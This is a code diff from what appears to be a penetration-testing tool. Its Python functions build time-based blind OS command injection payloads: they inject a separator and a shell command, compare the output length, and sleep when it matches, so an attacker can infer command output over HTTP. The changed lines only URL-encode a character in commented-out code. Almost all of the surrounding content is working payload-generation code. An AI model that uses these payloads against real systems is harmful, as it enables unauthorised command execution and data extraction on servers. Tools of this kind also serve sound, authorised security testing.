@@ -51,7 +51,7 @@ def decision(separator, TAG, output_length, timesec, http_request_method):
                  "str=$(echo " + TAG + ")" + separator + 
                  # Find the length of the output.
                  "str1=$(expr length \"$str\")" + separator +
-                 #"str1=${#str}" + separator + 
+                 #"str1=${%23str}" + separator + 
                  "if [ " + str(output_length) + " != $str1 ]" + separator + 
                  "then sleep 0" + separator + 
                  "else sleep " + str(timesec) + separator + 
@@ -64,7 +64,7 @@ def decision(separator, TAG, output_length, timesec, http_request_method):
                  "str=$(echo " + TAG + ")" + separator + 
                  # Find the length of the output.
                  "str1=$(expr length \"$str\")" + separator +
-                 #"str1=${#str}" + separator +  
+                 #"str1=${%23str}" + separator +  
                  "if [ " + str(output_length) + " != $str1 ]" + separator + 
                  "then sleep 0" + separator + 
                  "else sleep " + str(timesec) + separator + 
@@ -82,7 +82,7 @@ def decision(separator, TAG, output_length, timesec, http_request_method):
                  "str=$(echo " + TAG + ")" + separator + 
                  # Find the length of the output.
                  "str1=$(expr length \"$str\")" + separator +
-                 #"str1=${#str}" + separator + 
+                 #"str1=${%23str}" + separator + 
                  "[ " + str(output_length) + " -eq $str1 ]" + separator + 
                  "sleep " + str(timesec)
                  )
@@ -216,7 +216,7 @@ def cmd_execution(separator, cmd, output_length, timesec, http_request_method):
     if separator == ";" :
       payload = (separator + 
                  "str=\"$(echo $(" + cmd + "))\"" + separator + 
-                 #"str1=${#str}" + separator + 
+                 #"str1=${%23str}" + separator + 
                  "str1=$(expr length \"$str\")" + separator +
                  "if [ " + str(output_length) + " != $str1 ]" + separator + 
                  "then sleep 0" + separator + 
@@ -230,7 +230,7 @@ def cmd_execution(separator, cmd, output_length, timesec, http_request_method):
                  "str=\"$(echo $(" + cmd + "))\"" + separator + 
                  # Find the length of the output.
                  "str1=$(expr length \"$str\")" + separator +
-                 #"str1=${#str}" + separator + 
+                 #"str1=${%23str}" + separator + 
                  "if [ " + str(output_length) + " != $str1 ]" + separator + 
                  "then sleep 0" + separator + 
                  "else sleep " + str(timesec) + separator + 
@@ -248,7 +248,7 @@ def cmd_execution(separator, cmd, output_length, timesec, http_request_method):
                  "str=$(echo $(" + cmd + "))" + separator +
                  # Find the length of the output.
                  "str1=$(expr length $str)" + separator +
-                 #"str1=${#str}  " + separator + 
+                 #"str1=${%23str}  " + separator + 
                  "[ " + str(output_length) + " -eq $str1 ]" + separator + 
                  "sleep " + str(timesec)
                  )
